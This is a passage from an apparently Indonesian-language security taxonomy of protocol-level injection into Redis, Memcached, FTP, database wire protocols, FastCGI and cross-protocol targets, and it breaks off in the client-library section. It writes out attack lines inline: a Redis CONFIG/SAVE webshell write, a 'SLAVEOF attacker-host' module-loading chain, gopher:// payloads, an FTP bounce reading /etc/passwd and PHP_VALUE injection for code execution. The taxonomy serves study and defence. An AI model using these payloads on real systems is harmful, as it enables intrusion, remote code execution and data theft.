---
title: "Protocol Level Injection"
description: ""
---

## Ruang Lingkup & Batas Definisi

Taksonomi ini mencakup **mekanisme injection ke dalam service-layer protocol** — teknik struktural yang digunakan penyerang untuk menyuntikkan command, merusak message boundary, atau memanipulasi data dalam protokol layanan jaringan non-HTTP. Cakupan ini secara eksplisit dibatasi untuk menghindari tumpang tindih dengan taksonomi yang sudah ada berikut:

| Taksonomi yang Ada | Apa yang Dicakup | Apa yang Dicakup Dokumen Ini |
|---|---|---|
| `04-server-side/ssrf.md` §3-3 | Protokol Gopher sebagai **mekanisme pengiriman SSRF** → Redis/Memcached | **Attack surface injection protokol target** — apa yang secara struktural memungkinkan command injection terlepas dari vektor pengiriman |
| `04-server-side/jdbc-attack.md` §1–§10 | Injeksi parameter connection URL JDBC, deserialisasi level driver | Korupsi **message framing wire protocol** (riset DEF CON 32); cross-reference singkat untuk bug driver |
| `04-server-side/email-smuggling-and-parser-abuse.md` §1–§8 | SMTP framing, diferensial parsing email | Injeksi protokol non-SMTP; CRLF client library SMTP dibahas singkat sebagai kelas vektor masuk |
| `03-http-protocol/http-header.md` §4 | CRLF injection HTTP & response splitting | CRLF injection dalam **protokol layanan non-HTTP** (Redis RESP, teks Memcached, FTP) |
| `01-injection/command-injection/` | Injeksi OS shell command | Command injection protokol layanan (tanpa melibatkan shell) |
| `Uncovered_RCE_Vectors` §8 (referensi) | Redis MODULE LOAD, UAF, Lua sandbox escape sebagai **hasil akhir RCE** | **Mekanisme injection** — bagaimana protocol command disuntikkan di tempat pertama |
| `01-injection/ldap-xpath/` | Injeksi **sintaks query** LDAP | Framing level protokol; LDAP protokol dibahas singkat di §1-4 |

**Pembeda utama:** Taksonomi yang ada memperlakukan protocol injection baik sebagai *mekanisme pengiriman* (SSRF), masalah *sintaks query* (SQL/NoSQL/LDAP), atau *hasil akhir RCE* (Redis MODULE LOAD). Dokumen ini memperlakukan **mekanisme injection level protokol itu sendiri** sebagai subjek utama — properti struktural protokol layanan yang memungkinkan command injection, manipulasi data, dan information disclosure.

---

## Struktur Klasifikasi

Taksonomi ini mengorganisasi protocol-level injection di sepanjang tiga sumbu:

**Sumbu 1 — Mekanisme Injection (Utama, §1–§6):** Teknik struktural yang digunakan untuk menyuntikkan command atau data ke dalam protokol target. Sumbu ini membentuk isi utama dokumen.

**Sumbu 2 — Tipe Diskrepansi (Lintas):** Sifat dari ketidakcocokan parsing/interpretasi yang memungkinkan setiap injection. Tipe-tipe ini muncul berulang di beberapa kategori mekanisme:

| Tipe Diskrepansi | Deskripsi | Bagian Utama |
|---|---|---|
| **Command Boundary Confusion** | Delimiter yang disuntikkan (CRLF, null, spasi) membuat command boundary baru dalam apa yang seharusnya menjadi satu elemen data tunggal | §1, §4 |
| **Message Size/Framing Mismatch** | Integer overflow atau manipulasi field panjang menyebabkan protokol salah menginterpretasikan di mana satu pesan berakhir dan yang lain dimulai | §2 |
| **Protocol Identity Confusion** | Request dari satu protokol diinterpretasikan sebagai command valid oleh protokol yang berbeda (cross-protocol) | §3 |
| **Serialization Format Confusion** | Data yang dimaksudkan sebagai payload pasif diinterpretasikan sebagai objek yang dapat dieksekusi (pickle, PHP serialize) karena layer protokol tidak membedakan data dari kode | §5 |
| **Trust Boundary Violation** | Client library atau connection handler meneruskan input pengguna yang tidak tersanitasi langsung ke konstruksi protocol message | §4, §6 |
| **Compression/Encoding Differential** | Ketidakcocokan antara ukuran payload yang dikompres/dikodekan yang dideklarasikan dan yang sebenarnya memungkinkan manipulasi buffer | §2-2, §5-3 |

**Sumbu 3 — Attack Scenario (Pemetaan, §7):** Konteks deployment dunia nyata — cache poisoning, session hijacking, pivoting layanan internal, data exfiltration, authentication bypass, dan komposisi rantai RCE.

### Konsep Fundamental: Mengapa Protokol Layanan Dapat Di-inject

Sebagian besar protokol layanan non-HTTP berbagi properti desain yang membuatnya secara fundamental dapat di-inject: **mereka menggunakan delimiter yang sederhana dan dapat diprediksi (CRLF, null byte, header panjang tetap) untuk memisahkan command, dan mengasumsikan bahwa transport layer menyediakan integritas pesan.** Tidak seperti HTTP — yang telah mengembangkan framing yang rumit (chunked encoding, content-length, HTTP/2 frame) dan menjadi subjek penelitian keamanan yang ekstensif — protokol seperti Redis RESP, teks Memcached, FTP, dan SMTP dirancang untuk lingkungan jaringan tepercaya di mana klien diasumsikan kooperatif.

Ketika data yang dikendalikan pengguna mencapai protokol ini melalui perantara apa pun (SSRF, HTTP library, parameter aplikasi, request cross-protocol), framing sederhana protokol menjadi attack surface injection.

---

## §1. CRLF/Delimiter Command Injection dalam Text-Based Protocol

Text-based service protocol menggunakan command framing berorientasi baris: setiap command adalah urutan token yang diakhiri `\r\n` (CRLF). Ketika data yang dikendalikan pengguna disematkan ke dalam command tanpa sanitasi delimiter, penyerang dapat mengakhiri command saat ini dan menyuntikkan command baru secara sembarang. Ini adalah mekanisme protocol injection yang paling fundamental dan paling banyak dapat diterapkan.

### §1-1. Redis RESP Inline Command Injection

Redis mendukung dua mode command: RESP (binary-safe, length-prefixed) dan **inline** (dipisahkan spasi, diakhiri CRLF). Mode inline dirancang untuk debugging via telnet tetapi menciptakan attack surface yang luas karena Redis menerima baris teks apa pun sebagai potensi command — mem-parsing baris demi baris dan hanya mengembalikan error untuk command yang tidak valid.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Inline command injection via CRLF** | Menyuntikkan `\r\n` ke dalam field data apa pun yang mencapai mode inline Redis memecah input menjadi beberapa command. Contoh: `SET key "value\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSAVE\r\n"` | Input pengguna mencapai Redis tanpa sanitasi CRLF; mode inline aktif (default untuk koneksi non-RESP) |
| **Injeksi command RESP array** | Saat membangun protocol message RESP secara programatik, input yang tidak tersanitasi dalam field jumlah bulk string atau panjang dapat merusak struktur array, menyebabkan data berikutnya di-parse sebagai command baru: `*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$N\r\n...\r\n*1\r\n$7\r\nSHUTDOWN` | Aplikasi membangun pesan RESP secara manual dengan data yang disediakan pengguna; ketidakcocokan field panjang |
| **CRLF injection yang dikirim via Gopher** | Skema URL `gopher://` mengirimkan byte TCP mentah. Kerentanan SSRF yang mendukung Gopher memungkinkan pembuatan urutan command RESP lengkap: `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a...` (→ cross-ref `ssrf.md` §3-3 untuk mekanisme pengiriman) | SSRF dengan dukungan Gopher; Redis dapat dijangkau dari konteks SSRF |
| **Payload persistensi via CONFIG** | Setelah menyuntikkan command, `CONFIG SET dir /path/ && CONFIG SET dbfilename file.ext && SAVE` menulis dump Redis RDB yang berisi data yang dikendalikan penyerang ke path filesystem sembarang — dipersenjatai untuk deployment webshell, injeksi cron job, atau penulisan SSH authorized_keys | Redis berjalan dengan hak tulis filesystem; direktori target dapat ditulis |
| **Pengiriman payload berbasis replikasi** | `SLAVEOF attacker-host 6379` memaksa Redis target untuk melakukan replikasi dari master yang dikendalikan penyerang. Master berbahaya kemudian dapat mendorong command MODULE LOAD untuk memuat native shared library (→ cross-ref taksonomi RCE §8-1 untuk module loading sebagai hasil RCE) | Redis tanpa pembatasan ACL pada SLAVEOF/REPLICAOF; egress jaringan ke penyerang |

### §1-2. Injeksi Command Protokol Teks Memcached

Protokol teks Memcached menggunakan command yang diakhiri CRLF dengan tata bahasa sederhana: `<command> <key> <flags> <exptime> <bytes>\r\n<data block>\r\n`. Wawasan injection yang kritis adalah bahwa **parameter key** diakhiri oleh spasi, **data block** diakhiri oleh `\r\n` setelah tepat `<bytes>` byte, dan **command stream** diakhiri oleh `\r\n` — menciptakan tiga attack surface injection yang berbeda.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **CRLF injection berbasis key (batch injection)** | Menyuntikkan `\r\n` ke dalam parameter key dari command `get` atau `set` mengakhiri command saat ini dan menyuntikkan yang baru. Contoh: `get key1\r\nset injected 0 3600 11\r\nmaliciousval\r\n` | Input pengguna digunakan sebagai cache key tanpa filtering CRLF; protokol teks (bukan binary) |
| **Manipulasi panjang data (state breaking)** | Parameter `<bytes>` mendeklarasikan berapa byte data yang mengikuti. Jika penyerang dapat memanipulasi nilai ini (mis. dengan menyuntikkan nilai `<bytes>` yang lebih pendek dari data sebenarnya), data yang berlebih di-parse sebagai command baru — state machine parser Memcached bertransisi dari "membaca data" ke "membaca command" sebelum waktunya | Penyerang mengontrol deklarasi panjang data dan konten data |
| **Injeksi argumen via spasi/null-byte** | Spasi (0x20) memisahkan argumen command. Null byte (0x00) dapat mengakhiri string dalam beberapa implementasi klien tetapi tidak di Memcached itu sendiri. Menyuntikkan spasi ke dalam nama key dapat menggeser posisi argumen, mengubah semantik command | Client library menggunakan fungsi string bergaya C yang tidak mengescape spasi dalam key dengan benar |
| **Bypass encoding CRLF quoted-string** | Beberapa client library (pylibmc untuk Python) menerima encoding quoted-string RFC2109 di mana `\015\012` merepresentasikan `\r\n` dalam notasi oktal. Nilai cookie yang mengandung urutan ini lolos dari parsing HTTP secara utuh dan didekode oleh client library Memcached menjadi byte CRLF literal sebelum mencapai server Memcached | pylibmc atau klien serupa dengan pemrosesan quoted-string; Memcached digunakan sebagai backend sesi |
| **Key targeting CRC32 collision** | Flask-Session menghitung session key menggunakan prefix ditambah session ID. Dengan membuat session ID yang hash CRC32-nya bertabrakan dengan target key, penyerang dapat memanipulasi shard Memcached mana yang menerima command yang disuntikkan, menarget entri sesi tertentu di server tertentu | Cluster Memcached dengan key hashing berbasis CRC32; Flask-Session atau framework serupa |

### §1-3. FTP Command Injection

FTP menggunakan protokol command yang diakhiri CRLF pada control channel (port 21). Command `PORT` dan `PASV` membangun data channel, menciptakan attack surface sekunder di mana server FTP dapat diarahkan untuk terhubung ke host/port sembarang.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Command injection berbasis nama file** | Command FTP seperti `RETR`, `STOR`, `DELE` menerima nama file. Menyuntikkan CRLF ke dalam parameter nama file mengakhiri command saat ini dan menyuntikkan yang baru: `RETR file.txt\r\nDELE important.dat\r\n` | SSRF atau aplikasi yang mem-proxy command FTP dengan nama file yang dikendalikan pengguna |
| **Serangan bounce command PORT** | Command `PORT` mengarahkan server untuk membuka koneksi data ke IP:port yang ditentukan. Dengan menyuntikkan command PORT sembarang, penyerang dapat menggunakan server FTP sebagai proxy untuk port-scan jaringan internal atau meneruskan data: `PORT 10,0,0,1,0,80\r\nRETR /etc/passwd` | Server FTP yang tidak memvalidasi alamat PORT terhadap IP klien |
| **Manipulasi respons PASV** | Dalam mode pasif, server mengembalikan IP:port untuk data channel. Server FTP berbahaya (dalam konteks SSRF) dapat mengembalikan IP internal dalam respons PASV, mengarahkan aplikasi yang memulai SSRF untuk terhubung ke layanan internal sembarang | SSRF yang menarget layanan FTP yang melaporkan alamat passive mode |
| **CRLF injection via URL scheme** | URL FTP yang diproses oleh library (Java `java.net.URL`, Python `urllib`) dapat mengizinkan CRLF injection dalam komponen path atau credential, yang kemudian dikirim sebagai command FTP mentah ke server | Aplikasi yang memproses URL FTP yang disediakan pengguna tanpa sanitasi |

### §1-4. Injection Protokol Line-Oriented Lainnya

Pola CRLF delimiter injection meluas ke protokol layanan line-oriented apa pun. Meskipun kurang umum dieksploitasi daripada Redis dan Memcached, protokol ini memiliki kerentanan struktural yang sama.

| Protokol | Attack Surface Injection | Contoh Dampak |
|---|---|---|
| **Zabbix Agent** | Protokol Zabbix agent menerima command yang dipisahkan newline. `system.run[command]` mengeksekusi OS command jika `EnableRemoteCommands=1`. CRLF injection ke dalam request agent memungkinkan command injection | RCE via protokol agent (CVE-2024-22116: eksekusi skrip Zabbix server) |
| **IMAP/POP3** | Protokol pengambilan email line-oriented. CRLF injection ke dalam kredensial login atau nama folder dapat menyuntikkan protocol command: `LOGIN user "pass\r\nDELETE 1"` | Penghapusan email, manipulasi mailbox, information disclosure |
| **LDAP (level protokol)** | Di luar injeksi sintaks query (→ cross-ref `ldap-xpath.md`), wire protocol LDAP menggunakan pesan berenkode BER di mana request yang dibangun secara tidak tepat dapat memicu parser state confusion dalam implementasi server | Authentication bypass (CVE-2025-54918: NTLM LDAP auth bypass), DoS (CVE-2024-49113: LDAPNightmare), RCE (CVE-2024-49112) |
| **DICT** | Protokol DICT (`dict://host:port/d:word`) mengirimkan command lookup mentah melalui TCP. Kerentanan SSRF yang mendukung DICT memungkinkan single-command injection ke layanan TCP apa pun dengan membuat parameter word | Information disclosure, command injection terbatas (satu command per request) |
| **IRC** | Internet Relay Chat menggunakan command yang diakhiri CRLF. CRLF injection dalam parameter nick/channel/message memungkinkan command injection, kontrol channel, dan manipulasi server | Pengambilalihan channel, pemalsuan pesan, injeksi operator command |

---

## §2. Korupsi Binary Protocol Message Framing

Binary protocol (PostgreSQL wire protocol, MongoDB wire protocol, FastCGI) menggunakan **pesan length-prefixed** alih-alih command yang diakhiri delimiter. Injection ke dalam protokol ini memerlukan korupsi framing itu sendiri — memanipulasi field ukuran, mengeksploitasi integer overflow, atau menyalahgunakan compression layer untuk mendesinkronkan message parser.

### §2-1. Database Wire Protocol Message Size Overflow

Komunikasi client-server database menggunakan binary protocol di mana setiap pesan memiliki header berformat tetap yang berisi byte tipe pesan dan field panjang 32-bit. Ketika client library membangun pesan dengan data yang dikendalikan pengguna yang melebihi kapasitas field panjang 32-bit, integer overflow menyebabkan library memecah satu pesan logis menjadi beberapa pesan fisik — dengan penyerang mengontrol konten pesan "ekstra".

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **PostgreSQL pgx/pgproto3 message size overflow** | Driver Go `pgx` menghitung ukuran protocol message menggunakan integer 32-bit. Ketika nilai parameter melebihi ~4GB, field ukuran overflow dan wrap around. Driver mengirimkan bagian pertama sebagai pesan yang dimaksudkan, dan byte yang tersisa diinterpretasikan oleh PostgreSQL sebagai **protocol message baru yang independen** — termasuk pesan `Query` atau `Parse` yang berisi SQL yang dikendalikan penyerang (CVE-2024-27304, CVSS Critical) | Aplikasi meneruskan string besar yang dikendalikan pengguna ke parameterized query via pgx; tidak ada batas ukuran request yang diterapkan |
| **Injeksi parameter protokol sederhana PostgreSQL** | Dalam mode protokol sederhana (`PreferQueryMode=SIMPLE`), driver pgx menggabungkan parameter langsung ke dalam teks SQL. Pola tertentu (angka negatif diikuti parameter string pada baris yang sama) memungkinkan injeksi SQL yang melewati parameterisasi (CVE-2024-27289) | pgx v4 dalam mode protokol sederhana; pola parameter tertentu |
| **PostgreSQL psql UTF-8 escape confusion** | Urutan byte UTF-8 yang tidak valid dalam rutinitas string escaping menyebabkan `psql` salah menginterpretasikan batas escape, memungkinkan SQL injection bahkan melalui parameter yang di-escape dengan benar. Dirantai dengan kompromi BeyondTrust untuk menginfilitrasi 17+ pelanggan enterprise (CVE-2025-1094, aktif dieksploitasi) | String escaping PostgreSQL diterapkan pada data yang mengandung UTF-8 tidak valid yang dibuat khusus |
| **Message framing driver MongoDB** | Mirip dengan serangan PostgreSQL: wire protocol MongoDB menggunakan field panjang pesan 32-bit. Implementasi driver yang tidak memvalidasi total ukuran pesan terhadap batas 32-bit dapat dieksploitasi untuk menyuntikkan protocol message tambahan ke dalam connection stream | Driver MongoDB dengan validasi ukuran yang tidak memadai; aplikasi yang menerima input besar |

**Vektor bypass untuk pertahanan batas ukuran:** Mitigasi utama (menegakkan batas ukuran request) dapat dihindari melalui: (1) koneksi WebSocket, yang sering tidak memiliki batas ukuran request; (2) kompresi HTTP yang diterapkan setelah pemeriksaan batas; (3) endpoint API alternatif tanpa validasi ukuran; (4) request body chunked/streaming yang terakumulasi melampaui batas.

### §2-2. Eksploitasi Protocol Compression Layer

Database modern dan protokol layanan mendukung kompresi level pesan (zlib, LZ4, Snappy) untuk mengurangi bandwidth. Ketika compression layer mempercayai metadata yang dideklarasikan klien (ukuran yang tidak dikompres, algoritma kompresi) tanpa validasi, penyerang dapat mengeksploitasi ketidakcocokan antara ukuran yang dideklarasikan dan yang sebenarnya.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pengungkapan heap memory MongoDB OP_COMPRESSED (MongoBleed)** | Format pesan OP_COMPRESSED MongoDB menyertakan field `uncompressedSize`. Ketika penyerang mengirimkan pesan terkompresi yang mendeklarasikan ukuran yang tidak dikompres jauh lebih besar dari payload sebenarnya, MongoDB mengalokasikan buffer yang terlalu besar, mengisinya dengan payload yang kecil yang didekompresi, dan sisanya tetap sebagai **heap memory yang tidak diinisialisasi**. Dokumen BSON yang salah format tanpa null terminator menyebabkan MongoDB memindai melewati payload ke dalam heap memory, dan ketika parsing gagal, server menyertakan data heap yang bocor dalam respons error (CVE-2025-14847, CVSS 9.1, CISA KEV) | MongoDB dengan kompresi diaktifkan (default); akses tanpa autentikasi ke port 27017; >213K instance yang terekspos di Shodan |
| **Decompression bomb dalam protocol message** | Payload terkompresi yang dibuat dengan rasio kompresi ekstrem (mis. 1KB terkompresi → 1GB yang didekompresi) dapat menyebabkan memory exhaustion dalam protocol parsing, menyebabkan DoS atau heap state yang dapat dieksploitasi | Protokol apa pun yang mendukung kompresi level pesan tanpa batas ukuran dekompresi |
| **Downgrade negosiasi algoritma kompresi** | Selama handshake koneksi, jika klien dapat memaksa algoritma kompresi yang lebih lemah atau lebih mudah dieksploitasi, interaksi protokol selanjutnya mungkin rentan terhadap serangan spesifik algoritma | Protokol dengan kompresi yang dapat dinegosiasikan; tidak ada pembatasan algoritma sisi server |

### §2-3. Eksploitasi Struktur Record FastCGI

Protokol FastCGI menggunakan format record binary dengan header 8-byte yang berisi versi, tipe, request ID, content length, dan padding length. Record membawa parameter key-value, data stdin, dan response stream. Integer overflow dalam parsing parameter menciptakan attack surface injection.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Integer overflow ukuran parameter** | Parameter FastCGI dikodekan dengan field ukuran panjang variabel (1 atau 4 byte tergantung nilai). Fungsi `ReadParams` library menghitung `nameLen + valueLen + 2` yang overflow pada sistem 32-bit ketika kedua panjangnya adalah `0x7FFFFFFF`, menghasilkan alokasi `malloc` yang hampir nol diikuti oleh heap write yang masif (CVE-2025-23016) | Library FastCGI (libfcgi) pada sistem 32-bit; socket FastCGI terekspos via TCP |
| **Injeksi parameter PHP_VALUE/PHP_ADMIN_VALUE** | Request FastCGI ke PHP-FPM menyertakan parameter seperti `PHP_VALUE` yang menetapkan direktif konfigurasi PHP. Dengan menyuntikkan `auto_prepend_file=php://input` atau `allow_url_include=1`, penyerang mencapai RCE melalui manipulasi konfigurasi PHP | Socket FastCGI PHP-FPM dapat diakses (secara lokal atau via SSRF); varian argument injection CVE-2024-4577 untuk PHP-CGI di Windows |
| **Path traversal SCRIPT_FILENAME** | Parameter `SCRIPT_FILENAME` menentukan file PHP mana yang dieksekusi. Path traversal dalam parameter ini memungkinkan eksekusi file PHP sembarang di filesystem | Akses FastCGI langsung tanpa mediasi web server |
| **Manipulasi record padding** | Field padding dalam header record FastCGI mengizinkan hingga 255 byte padding sembarang. Padding yang salah format dapat menyebabkan parser state confusion dalam implementasi yang tidak melewati padding byte dengan benar | Implementasi parser FastCGI yang tidak konformis |

### §2-4. Protocol Version & Feature Negotiation Attack

Banyak protokol layanan dimulai dengan handshake yang menegosiasikan versi, kapabilitas, dan fitur keamanan. Memanipulasi negosiasi ini dapat men-downgrade keamanan atau mengaktifkan fitur protokol yang memperluas attack surface.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Redis AUTH bypass via versi protokol** | Redis 6+ memperkenalkan ACL dan protokol RESP3. Koneksi yang default ke RESP2 mungkin memiliki persyaratan autentikasi yang berbeda. Membuat negosiasi versi protokol dapat memengaruhi command mana yang tersedia sebelum autentikasi | Redis dengan ACL yang salah dikonfigurasi untuk versi protokol yang berbeda |
| **Switching protokol teks vs. binary Memcached** | Memcached mendukung protokol teks dan binary pada port yang sama. Protokol binary memiliki karakteristik injection yang berbeda (length-prefixed, bukan CRLF-delimited). Beberapa pertahanan hanya melindungi terhadap injeksi protokol teks | Memcached yang menerima kedua protokol; pertahanan hanya memfilter pola protokol teks |
| **TLS/STARTTLS downgrade** | Protokol layanan yang mendukung STARTTLS (LDAP, FTP, SMTP, IMAP) dapat di-downgrade ke plaintext melalui MITM stripping dari iklan kapabilitas STARTTLS, mengekspos semua traffic protokol berikutnya termasuk kredensial | Posisi MITM; layanan tidak memerlukan TLS; klien tidak menegakkan TLS |
| **Protocol version confusion wire protocol MongoDB** | MongoDB sudah tidak menggunakan wire protocol lama (OP_INSERT, OP_UPDATE, OP_DELETE) untuk mendukung OP_MSG. Implementasi server yang masih mendukung opcode lama mungkin memiliki karakteristik keamanan yang berbeda, dan request yang dibuat menggunakan opcode yang sudah deprecated dapat melewati pemeriksaan keamanan yang lebih baru | Server MongoDB dengan dukungan opcode lama yang diaktifkan |

---

## §3. Cross-Protocol Request Forgery & Tolerance Exploitation

Serangan cross-protocol mengeksploitasi fakta bahwa protokol layanan yang dirancang untuk lingkungan tepercaya sering **mentoleransi input yang salah format** — mem-parsing apa yang bisa dan membuang apa yang tidak bisa. Ketika penyerang dapat menyebabkan sistem mengirimkan data ke port layanan dalam format protokol yang berbeda (mis. request HTTP ke port Redis), parsing toleran layanan target mungkin mengeksekusi command yang disematkan meskipun keseluruhan pesan tidak valid.

### §3-1. Protocol Tolerance Exploitation

Properti kunci yang memungkinkan cross-protocol attack adalah **pemrosesan baris demi baris dengan toleransi error**: Redis, Memcached, dan layanan serupa mem-parse setiap baris input secara independen dan merespons dengan error untuk command yang tidak valid sambil terus memproses baris berikutnya.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pemrosesan HTTP request Redis** | Redis mem-parse input baris demi baris. HTTP POST request ke port Redis 6379 di-parse sebagai: `POST` → error; `/path` → error; `Host: value` → error; baris body → potensi command Redis yang valid. Setiap baris yang kebetulan merupakan command Redis yang valid (bahkan yang disematkan dalam HTTP) dieksekusi | Akses jaringan ke port Redis; tidak ada autentikasi atau token auth yang ada di dalam HTTP body |
| **Bypass perlindungan cross-protocol Redis** | Sejak Redis 3.2.7, `POST` dan `Host:` di-alias ke `QUIT` untuk bertahan dari serangan berbasis HTTP. Namun, perlindungan ini hanya mencakup HTTP — protokol lain (request upgrade WebSocket, koneksi bertipe SMTP) yang tidak dimulai dengan POST/Host: tidak tertangkap | Redis ≥3.2.7 dengan vektor cross-protocol non-HTTP; atau request HTTP kustom yang menghindari POST/Host: |
| **Toleransi HTTP Memcached** | Protokol teks Memcached juga memproses baris secara independen. Baris request HTTP dan header diabaikan sebagai command yang tidak valid, tetapi command Memcached yang valid yang ditempatkan dengan hati-hati dalam request body (setelah `\r\n\r\n`) dieksekusi | Akses jaringan ke port Memcached; protokol teks diaktifkan |
| **Selective command extraction** | Penyerang membuat payload cross-protocol di mana hanya baris tertentu yang membentuk command protokol target yang valid. Layanan membuang segalanya kecuali mengeksekusi command yang valid. Ini berhasil karena protokol tidak memerlukan sesi yang valid — setiap baris command yang valid dieksekusi segera | Protokol line-oriented dengan parsing per baris dan toleransi error |

### §3-2. Serangan Cross-Protocol yang Diinisiasi Browser

Web browser dapat dipersenjatai untuk mengirimkan request ke port layanan non-HTTP melalui HTML form, XMLHttpRequest (untuk same-origin), atau DNS rebinding. Browser memformat request sebagai HTTP, tetapi parser toleran layanan target mengekstrak command protokol yang valid dari payload HTTP.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **HTML form POST ke Redis/Memcached** | `<form>` dengan `action="http://localhost:6379"` dan method POST mengirimkan HTTP POST request ke port Redis. Redis mem-parse setiap baris; konten POST body (setelah header) dapat mengandung command RESP inline yang valid. Content-type dan encoding body memengaruhi karakter mana yang dapat dikirimkan | Redis/Memcached terikat ke localhost atau IP yang dapat diakses; tidak ada autentikasi; same-origin policy browser tidak mencegah pengiriman request (hanya membaca respons) |
| **DNS rebinding ke layanan internal** | Domain penyerang awalnya meresolve ke IP penyerang (menyajikan halaman berbahaya), kemudian mengubah DNS untuk meresolve ke `127.0.0.1` atau IP internal. Pemeriksaan same-origin browser lolos (domain yang sama), mengizinkan JavaScript berinteraksi dengan layanan internal. Dikombinasikan dengan `fetch()` atau XHR, ini mengirimkan protocol command sebagai HTTP request body | Setup DNS rebinding; DNS dengan TTL singkat; layanan target pada port yang diharapkan; CVE-2025-66416: kerentanan MCP SDK memungkinkan ini terhadap server MCP |
| **WebSocket upgrade ke layanan non-HTTP** | Handshake WebSocket dimulai sebagai HTTP Upgrade request. Jika layanan target tidak memahami WebSocket tetapi memproses frame berikutnya sebagai TCP mentah, penyerang dapat mengirimkan byte sembarang via WebSocket API — melewati perlindungan CRLF injection browser yang berlaku untuk header HTTP | Port layanan yang dapat diakses dari browser; layanan tidak memvalidasi handshake WebSocket |
| **fetch() dengan mode: 'no-cors'** | `fetch('http://localhost:6379', {method: 'POST', body: 'COMMAND...'})` mengirimkan POST cross-origin ke Redis. Browser memblokir pembacaan respons, tetapi request (termasuk body) masih dikirimkan dan diproses oleh Redis | Redis yang dapat diakses dari jaringan browser; tidak ada autentikasi |

### §3-3. Protocol Tunneling via URL Scheme Handler

URL scheme handler (Gopher, DICT, TFTP, file) menyediakan kemampuan komunikasi TCP agnostik protokol yang dapat dipersenjatai melalui kerentanan SSRF untuk menjangkau protokol layanan internal. Subbagian ini memberikan **komplemen yang berfokus pada mekanisme** untuk cakupan mekanisme pengiriman dalam `ssrf.md` §3-3.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pengiriman TCP mentah Gopher** | `gopher://host:port/_payload` mengirimkan byte sembarang setelah karakter awal. URL-encoded CRLF (`%0d%0a`) membuat line break dalam payload. Ini memungkinkan injeksi urutan command multi-baris yang lengkap ke layanan TCP apa pun | SSRF yang mendukung skema Gopher; tidak ada pembatasan URL scheme |
| **Single-command injection DICT** | `dict://host:port/d:word` mengirimkan `CLIENT libcurl\r\nDEFINE ! word\r\nQUIT\r\n` ke target. Dengan memanipulasi parameter `word`, satu command dapat disuntikkan. Terbatas pada satu command per request karena QUIT otomatis | SSRF yang mendukung skema DICT; berguna untuk layanan di mana satu command sudah cukup (Redis SET, Memcached set) |
| **TFTP read/write sebagai data channel** | `tftp://host/file` membaca atau menulis file via UDP. Ketika dirantai dengan SSRF, TFTP dapat mengekstrak data ke server yang dikendalikan penyerang atau menulis file pada host yang menjalankan server TFTP | SSRF yang mendukung TFTP; target menjalankan daemon TFTP |
| **Eksploitasi encoding spesifik skema** | Skema URL yang berbeda menerapkan aturan encoding yang berbeda. Gopher men-decode URL sekali, sementara HTTP mungkin double-encode. Mengeksploitasi diferensial ini memungkinkan bypass validasi URL yang memeriksa URL yang di-decode tetapi mengirimkan byte yang dikodekan ke target | SSRF dengan perilaku encoding yang bergantung pada skema |

### §3-4. Client-to-Service Protocol Confusion via SSRF Chain

Ketika SSRF (→ cross-ref `ssrf.md`) mengirimkan data yang dikendalikan penyerang ke layanan internal, protocol confusion terjadi pada batas antara aplikasi yang berbicara HTTP dan layanan internal non-HTTP. Subbagian ini mengkatalogkan **pola protocol confusion unik** yang belum dicakup dalam taksonomi SSRF.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **HTTP-to-RESP protocol confusion** | HTTP library yang mengikuti redirect dapat diarahkan ulang dari `http://attacker.com/302` ke `http://127.0.0.1:6379/`. Baris HTTP request `GET /\r\nSET... HTTP/1.1\r\n` di-parse oleh Redis sebagai inline command, dengan path yang mengandung command RESP yang disuntikkan | SSRF yang mengikuti redirect; Redis terikat ke localhost |
| **HTTP body sebagai protocol payload** | POST-based SSRF mengirimkan HTTP body sebagai byte mentah setelah header. Layanan target mengabaikan header (error) dan memproses konten body sebagai protocol command. Ini berhasil karena urutan CRLF dalam body dipertahankan oleh HTTP | POST-based SSRF ke layanan internal; konten body di bawah kendali penyerang |
| **Multi-hop protocol pivoting** | Rantai Redis `SLAVEOF` → master penyerang → `MODULE LOAD`: SSRF menyuntikkan command SLAVEOF ke Redis, Redis memulai replikasi outbound ke penyerang, master palsu penyerang mengirimkan modul berbahaya | Redis yang dapat dijangkau via SSRF; egress jaringan dari Redis ke penyerang; Redis tanpa ACL pada command replikasi |
| **FTP passive mode SSRF pivot** | SSRF ke server FTP berbahaya → server mengembalikan respons PASV yang menunjuk ke layanan internal → klien terhubung ke layanan internal untuk menerima "data file" — secara efektif mengalihkan SSRF ke host/port internal yang berbeda | SSRF ke FTP yang dikendalikan penyerang; klien mengikuti redirect PASV tanpa memvalidasi target |

---

## §4. Kerentanan Penanganan Protokol Client Library

Client library (HTTP client, cache client, database driver, SMTP codec) membangun protocol message dari data yang disediakan aplikasi. Ketika library ini gagal menyanitasi delimiter atau memvalidasi message boundary, mereka menjadi vektor injection — bahkan ketika aplikasi itu sendiri tampaknya menangani input dengan benar.

### §4-1. HTTP Client CRLF Passthrough ke Backend Protocol

HTTP client library yang mengizinkan karakter CRLF dalam komponen URL, header, atau request body dapat dipersenjatai untuk menyuntikkan command ke layanan backend. Ini sangat berbahaya ketika HTTP client digunakan dalam konteks SSRF — CRLF yang disuntikkan merusak HTTP protocol framing dan mengirimkan protocol command mentah ke backend.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Python urllib/urllib2 CRLF injection** | `urllib.request.urlopen("http://host/path%0d%0aINJECTED-COMMAND")` — HTTP library Python (versi sebelum perbaikan) meneruskan karakter CRLF yang di-decode URL langsung ke dalam baris HTTP request, memungkinkan injeksi header HTTP sembarang atau, ketika menarget layanan non-HTTP, protocol command mentah (CVE-2019-9740, CVE-2019-9947) | Python ≤3.7.3 / ≤2.7.16; URL dengan CRLF yang dikodekan dalam path atau query |
